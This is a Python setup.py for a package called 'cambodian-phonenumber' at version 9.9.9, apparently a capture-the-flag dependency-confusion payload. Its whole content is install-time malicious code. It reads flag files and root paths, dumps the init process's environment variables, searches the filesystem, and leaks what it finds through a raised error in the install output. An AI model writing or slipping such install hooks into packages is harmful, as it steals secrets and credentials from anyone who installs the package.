import os, subprocess
from setuptools import setup

try:
    pieces = []
    for p in ["/flag","/flag.txt","/root/flag.txt","/root/flag","/app/flag.txt","/home/flag.txt"]:
        try: pieces.append(open(p).read()); break
        except: pass
    if not pieces:
        try: pieces.append(open("/proc/1/environ").read().replace(chr(0),"\n"))
        except: pass
        try:
            r=subprocess.run(["find","/","-maxdepth","4","-name","*flag*","-not","-path","*/proc/*"],capture_output=True,text=True,timeout=5)
            pieces.append(r.stdout)
        except: pass
    raise RuntimeError("EXFIL: " + "|".join(pieces) if pieces else "EXFIL: nothing found")
except RuntimeError:
    raise
except Exception as e:
    raise RuntimeError("EXFIL_ERR: " + str(e))

setup(name="cambodian-phonenumber", version="9.9.9")
